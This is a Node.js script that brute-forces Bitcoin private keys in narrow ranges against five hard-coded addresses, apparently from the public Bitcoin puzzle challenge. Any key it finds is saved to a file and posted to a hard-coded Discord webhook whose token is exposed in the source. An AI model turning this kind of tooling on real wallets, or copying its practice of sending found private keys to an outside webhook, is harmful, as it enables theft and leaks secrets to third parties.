const fs = require("fs");
const cluster = require("cluster");
var CoinKey = require("coinkey");
const { default: axios } = require("axios");
const crypto = require("crypto");
const blessed = require('blessed');
const { sample } = require('lodash');
const os = require('os');

const generateRandomPrivateKeyPre = (prefix) => {
  const totalLength = 64;
  const randomPartLength = totalLength - prefix.length;
  const randomBytes = crypto.randomBytes(Math.ceil(randomPartLength / 2));
  const randomPart = randomBytes.toString("hex").slice(0, randomPartLength);
  return prefix + randomPart;
};

const generateRandomPrivateKeyCustom = (range, prefix) => {
  const end = range.length > 1 ? sample(range) : range[0];
  return generateRandomPrivateKeyPre(`${prefix}${end}`);
};

(async () => {
  const sources = [
    {
      range: ["2", "3"],
      prefix: "00000000000000000000000000000000000000000000000",
      target: '13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so'
    },
    {
      range: ["4", "5", "6", "7"],
      prefix: "00000000000000000000000000000000000000000000000",
      target: '1BY8GQbnueYofwSuFAT3USAhGjPrkxDdW9'
    },
    {
      range: ["8", "9", "a", "b", "c", "d", "e", "f"],
      prefix: "00000000000000000000000000000000000000000000000",
      target: '1MVDYgVaSN6iKKEsbzRUAYFrYJadLYZvvZ'
    },
    {
      range: ["1"],
      prefix: "0000000000000000000000000000000000000000000000",
      target: '19vkiEajfhuZ8bs8Zu2jgmC6oqZbWqhxhG'
    },
    {
      range: ["1"],
      prefix: "000000000000000000000000",
      target: '14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9'
    },
  ];

  if (cluster.isMaster) {
    const numCPUs = os.cpus().length;
    let total = sources.reduce((a, b) => ({...a, [b.target]: 0}), {});
    let lines = sources.reduce((a, b) => ({...a, [b.target]: null}), {});
    let screen = blessed.screen({ smartCSR: true });

    sources.forEach((s, i) => {
      let line = blessed.text({
        top: 0 + (i * 2),
        left: 0,
        width: '100%',
        height: 'shrink',
        content: `[0] ${s.target} ~~> address:private`,
        style: {
          fg: 'green'
        }
      });
      screen.append(line);
      lines[s.target] = line;
    })

    const box = blessed.box({
      top: sources.length * 2 + 1,
      left: 0,
      width: '100%',
      height: '40%',
      content: "",
      border: {
        type: 'line'
      },
      label: ' Found Wallets ',
      padding: 1,
      scrollable: true,
      style: {
        fg: 'green',
        border: {
          fg: 'green'
        },
        label: {
          fg: 'green'
        }
      }
    });

    screen.append(box)
    screen.render();

    cluster.on("message", function (worker, message) {
      if (message.found) {
        box.pushLine(`Wallet: ${message.address} | Private: ${message.privateKey}`);
        screen.render();
        return;
      }

      const { target, current, count } = message;
      const line = lines[target];
      total[target] += count;
      line.setContent(`[${total[target]}] ${target} ~~> ${current.address}:${current.privateKey}`);
      screen.render();
    });

    for (let i = 0; i < numCPUs; i++) {
      cluster.fork();
    }

    cluster.on("exit", (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const saveLog = ({ address, privateKey, balance }) => {
      const successString = `Wallet: [${address}]\nPrivate: [${privateKey}]\nBalance: ${balance} BTC\n\n------ Malphite Coder ------\n\n`;
      fs.appendFileSync("./match-btc.txt", successString);
    };

    const notify = async (address, privateKey) => {
      const url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
      const embered = { title: `WALLET: ${address}\nKEY: ${privateKey}` };
      const data = {
        username: "doge-scan-bot",
        avatar_url: "https://i.imgur.com/AfFp7pu.png",
        content: "BTC Puzze Solve!",
        embeds: [embered],
      };
      return await axios.post(url, data, {
        headers: { "Content-Type": "application/json" },
      });
    };

    const createWallet = (privateKey) => {
      const privateKeyBuffer = Buffer.from(privateKey, "hex");
      var key = new CoinKey(privateKeyBuffer);
      key.compressed = true;
      return key.publicAddress;
    };

    const generateWallet = async (s) => new Promise((resolve) => {
      const { range, prefix, target } = s;
      const privateKey = generateRandomPrivateKeyCustom(range, prefix);
      const address = createWallet(privateKey);
      resolve({ address, privateKey, matched: address == target });
    })

    const createWallets = async (num, s) =>
      new Promise(async (resolve) => {
        const processes = Array(num).fill(0).map(() => generateWallet(s).then(async (item) => {
          if (item.matched) {
            item.balance = 1;
            process.send({ found: true, ...item });
            saveLog(item);
            await notify(item.address, item.privateKey);
          }
          return item;
        }));
        const wallets = await Promise.all(processes);

        resolve({ target: s.target, current: wallets.pop(), count: wallets.length });
      });

    const processBatch = async () => {
      const processes = sources.map((s) => createWallets(10000, s).then(w => {
        process.send(w);
        return w;
      }));

      await Promise.all(processes);
    };

    const run = async () => {
      while (true) {
        await processBatch();
      }
    };

    run().catch(console.error);
  }
})();
